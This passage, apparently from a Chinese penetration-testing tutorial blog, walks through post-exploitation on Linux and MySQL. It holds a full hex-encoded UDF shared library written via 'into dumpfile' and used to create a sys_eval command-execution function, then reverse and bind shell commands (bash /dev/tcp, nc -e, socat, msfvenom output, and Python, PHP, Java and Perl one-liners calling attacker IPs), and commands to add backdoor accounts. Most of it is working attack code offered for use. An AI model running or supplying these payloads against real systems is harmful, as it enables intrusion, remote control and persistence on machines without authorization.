FF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;) into dumpfile &#x27;/path_plugin/xxx.so&#x27;;</span><br></pre></td></tr></table></figure><p>写入之后，执行创建函数的命令，就会创建一个sys_eval的函数，用来执行系统命令，这个函数执行的系统命令全部都是system权限的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string &#x27;xxx.so&#x27;;</span><br></pre></td></tr></table></figure><p>sys_eval这个函数就可以执行系统命令，括号里输入系统命令即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p>另外也可以用sqlmap提权，详情参考windows提权总结的数据库提权</p><h2 id="15-反弹shell"><a href="#15-反弹shell" class="headerlink" title="15.反弹shell"></a>15.反弹shell</h2><p>我们已经得到主机的一个webshell,我们想获取一个可以直接操作主机的虚拟终端 </p><h3 id="1-正向连接"><a href="#1-正向连接" class="headerlink" title="1.正向连接"></a>1.正向连接</h3><p>目标具有公网ip，可以连接外网。由于各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e这里都被阉割了，所以我们需要自己上传一个netcat；或者手动下载二进制安装包，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">1.wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz   #下载二进制netc安装包</span><br><span class="line">2.tar -xvzf netcat-0.7.1.tar.gz  #解压安装包</span><br><span class="line">3../configure  #编译安装</span><br><span class="line">4.make</span><br><span class="line">5.make install</span><br><span class="line">6.make clean</span><br><span class="line">7.nc -h   #查看是否安装成功，出现以下就代表安装成功</span><br><span class="line">GNU netcat 0.7.1, a rewrite of the famous networking tool.</span><br><span class="line">Basic usages:</span><br><span class="line">connect to somewhere:  nc [options] hostname port [port] ...</span><br><span class="line">listen for inbound:    nc -l -p port [options] [hostname] [port] ...</span><br><span class="line">tunnel to somewhere:   nc -L hostname:port -p port [options]</span><br><span class="line">Mandatory arguments to long options are mandatory for short options too.</span><br><span class="line">Options:</span><br><span class="line">  -c, --close                close connection on EOF from stdin</span><br><span class="line">  -e, --exec=PROGRAM         program to exec after connect</span><br><span class="line">  -g, --gateway=LIST         source-routing hop point[s], up to 8</span><br><span class="line">  -G, --pointer=NUM          source-routing pointer: 4, 8, 12, ...</span><br><span class="line">  -h, --help                 display this help and exit</span><br><span class="line">  -i, --interval=SECS        delay interval for lines sent, ports scanned</span><br><span class="line">  -l, --listen               listen mode, for inbound connects</span><br><span class="line">  -L, --tunnel=ADDRESS:PORT  forward local port to remote address</span><br><span class="line">  -n, --dont-resolve         numeric-only IP addresses, no DNS</span><br><span class="line">  -o, --output=FILE          output hexdump traffic to FILE (implies -x)</span><br><span class="line">  -p, --local-port=NUM       local port number</span><br><span class="line">  -r, --randomize            randomize local and remote ports</span><br><span class="line">  -s, --source=ADDRESS       local source address (ip or hostname)</span><br><span class="line">  -t, --tcp                  TCP mode (default)</span><br><span class="line">  -T, --telnet               answer using TELNET negotiation</span><br><span class="line">  -u, --udp                  UDP mode</span><br><span class="line">  -v, --verbose              verbose (use twice to be more verbose)</span><br><span class="line">  -V, --version              output version information and exit</span><br><span class="line">  -x, --hexdump              hexdump incoming and outgoing traffic</span><br><span class="line">  -w, --wait=SECS            timeout for connects and final net reads</span><br><span class="line">  -z, --zero                 zero-I/O mode (used for scanning)</span><br><span class="line">Remote port number can also be specified as range.  Example: &#x27;1-1024&#x27;</span><br></pre></td></tr></table></figure><p>目标开启本地监听并将本地的bash发布出去：<code>nc -lvvp 8080 -t -e /bin/bash</code></p><p>攻击机直连目标获得root权限：<code>nc target-ip 8080</code></p><h3 id="2-反向连接"><a href="#2-反向连接" class="headerlink" title="2.反向连接"></a>2.反向连接</h3><p>目标为内网主机，没有公网ip，无法被外网直接访问，但是可以出网，我们可以让目标访问外网。方法很多，介绍几种常见的方法，和windows差不多。</p><h4 id="1-bash直接反弹"><a href="#1-bash直接反弹" class="headerlink" title="1.bash直接反弹"></a>1.bash直接反弹</h4><p>一句话直接反弹：<code>bash -i &gt;&amp; /dev/tcp/target-ip/8080 0&gt;&amp;1</code></p><p><strong>解释</strong>：</p><p><code>bash -i </code>：产生一个bash交互环境</p><p><code>&gt;&amp;</code>：将联合符号的内容与后面相结合然后一起重定向给后者</p><p><code>/dev/tcp/target-ip/8080</code>：linux环境中所有内容均以文件形式存在，让主机与目标主机<code>target-ip/port</code>建立一个tcp连接</p><p><code>0&gt;&amp;1</code>：将标准输入与输出相结合，然后重定向给前面标准输出的内容</p><p>总结：bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p><h4 id="2-nc反弹"><a href="#2-nc反弹" class="headerlink" title="2.nc反弹"></a>2.nc反弹</h4><p>linux自带的nc无法反弹一个bash给远端，需要手动上传一个或者下载一个nc，但是nc反弹的shell交互性比较差。</p><p>攻击机开启监听：<code>nc -lvvp 8080</code></p><p>目标机：<code>nc server-ip 8080 -t -e /bin/bash</code></p><h4 id="3-socat反弹"><a href="#3-socat反弹" class="headerlink" title="3.socat反弹"></a>3.socat反弹</h4><p>nc的加强版</p><p>攻击机开启监听：<code>socat TCP-LISTEN:12345 -</code></p><p>目标机：<code>./socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:server-ip：12345</code></p><h4 id="4-msf反弹"><a href="#4-msf反弹" class="headerlink" title="4.msf反弹"></a>4.msf反弹</h4><p>列出支持的cmd模块（支持python、perl、bash、netcat等）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; msfvenom -l payloads |grep &quot;cmd/unix/reverse&quot;</span><br><span class="line">[*] exec: msfvenom -l payloads |grep &quot;cmd/unix/reverse&quot;</span><br><span class="line"></span><br><span class="line">    cmd/unix/reverse                                    Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_awk                                Creates an interactive shell via GNU AWK</span><br><span class="line">    cmd/unix/reverse_bash                               Creates an interactive shell via bash&#x27;s builtin /dev/tcp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.</span><br><span class="line">    cmd/unix/reverse_bash_telnet_ssl                    Creates an interactive shell via mkfifo and telnet. This method works on Debian and other systems compiled without /dev/tcp support. This module uses the &#x27;-z&#x27; option included on some systems to encrypt using SSL.</span><br><span class="line">    cmd/unix/reverse_bash_udp                           Creates an interactive shell via bash&#x27;s builtin /dev/udp. This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/udp feature.</span><br><span class="line">    cmd/unix/reverse_ksh                                Connect back and create a command shell via Ksh. Note: Although Ksh is often available, please be aware it isn&#x27;t usually installed by default.</span><br><span class="line">    cmd/unix/reverse_lua                                Creates an interactive shell via Lua</span><br><span class="line">    cmd/unix/reverse_ncat_ssl                           Creates an interactive shell via ncat, utilizing ssl mode</span><br><span class="line">    cmd/unix/reverse_netcat                             Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_netcat_gaping                      Creates an interactive shell via netcat</span><br><span class="line">    cmd/unix/reverse_nodejs                             Continually listen for a connection and spawn a command shell via nodejs</span><br><span class="line">    cmd/unix/reverse_openssl                            Creates an interactive shell through two inbound connections</span><br><span class="line">    cmd/unix/reverse_perl                               Creates an interactive shell via perl</span><br><span class="line">    cmd/unix/reverse_perl_ssl                           Creates an interactive shell via perl, uses SSL</span><br><span class="line">    cmd/unix/reverse_php_ssl                            Creates an interactive shell via php, uses SSL</span><br><span class="line">    cmd/unix/reverse_python                             Connect back and create a command shell via Python</span><br><span class="line">    cmd/unix/reverse_python_ssl                         Creates an interactive shell via python, uses SSL, encodes with base64 by design.</span><br><span class="line">    cmd/unix/reverse_r                                  Connect back and create a command shell via R</span><br><span class="line">    cmd/unix/reverse_ruby                               Connect back and create a command shell via Ruby</span><br><span class="line">    cmd/unix/reverse_ruby_ssl                           Connect back and create a command shell via Ruby, uses SSL</span><br><span class="line">    cmd/unix/reverse_socat_udp                          Creates an interactive shell via socat</span><br><span class="line">    cmd/unix/reverse_ssl_double_telnet                  Creates an interactive shell through two inbound connections, encrypts using SSL via &quot;-z&quot; option</span><br><span class="line">    cmd/unix/reverse_stub                               Creates an interactive shell through an inbound connection (stub only, no payload)</span><br><span class="line">    cmd/unix/reverse_zsh                                Connect back and create a command shell via Zsh. Note: Although Zsh is often available, please be aware it isn&#x27;t usually installed by default.</span><br><span class="line">msf5 &gt; </span><br></pre></td></tr></table></figure><p>选择对应的payload生成一句话木马(参数R可要可不要)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; msfvenom -p cmd/unix/reverse_ncat_ssl lhost=192.168.5.1 lport=1234 R</span><br><span class="line">[*] exec: msfvenom -p cmd/unix/reverse_ncat_ssl lhost=192.168.5.1 lport=1234 R</span><br><span class="line"></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload</span><br><span class="line">[-] No arch selected, selecting arch: cmd from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 38 bytes</span><br><span class="line">ncat -e /bin/sh --ssl 192.168.5.1 1234s</span><br></pre></td></tr></table></figure><p>攻击机开启监听：<code>nc -lvvp 1234</code></p><p>目标执行一句话木马：<code>ncat -e /bin/sh --ssl 192.168.5.1 1234s</code></p><h4 id="5-脚本语言一句话反弹"><a href="#5-脚本语言一句话反弹" class="headerlink" title="5.脚本语言一句话反弹"></a>5.脚本语言一句话反弹</h4><p><strong>python</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p><strong>php</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.31.41&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure><p><strong>java</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><p><strong>perl</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#x27;use Socket;$i=&quot;192.168.31.41&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure><p>网络上还有其他各种脚本，没有好坏之分，主要是看效果啦</p><h3 id="3-解决交互性差-甚至没有"><a href="#3-解决交互性差-甚至没有" class="headerlink" title="3.解决交互性差(甚至没有)"></a>3.解决交互性差(甚至没有)</h3><p>问题1： 获取的虚拟终端没有交互性，我们想给添加的账号设置密码，无法完成。 </p><p><strong>问题2</strong>：标准的错误输出无法显示，无法正常使用vim等文本编辑器等； </p><p>问题3： 获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p><p>为了解决上述问题，有以下一些解决方案</p><h4 id="1-一句话添加账号"><a href="#1-一句话添加账号" class="headerlink" title="1.一句话添加账号"></a>1.一句话添加账号</h4><h5 id="1-chpassed"><a href="#1-chpassed" class="headerlink" title="1.chpassed"></a>1.chpassed</h5><p>在反弹的shell中执行语句：<code>useradd newuser;echo &quot;newuser:password&quot;|chpasswd</code></p><h5 id="2-useradd-p"><a href="#2-useradd-p" class="headerlink" title="2.useradd -p"></a>2.useradd -p</h5><p>在反弹的shell中执行语句：<code>useradd -p encrypted_password newuser</code></p><h5 id="3-echo-e"><a href="#3-echo-e" class="headerlink" title="3.echo -e"></a>3.echo -e</h5><p>在反弹的shell中执行语句：<code>useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</code></p><h4 id="2-python-标准虚拟终端获取"><a href="#2-python-标准虚拟终端获取" class="headerlink" title="2.python 标准虚拟终端获取"></a>2.python 标准虚拟终端获取</h4><p>使用python 一句话获取标准shell:<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p>参考：<a 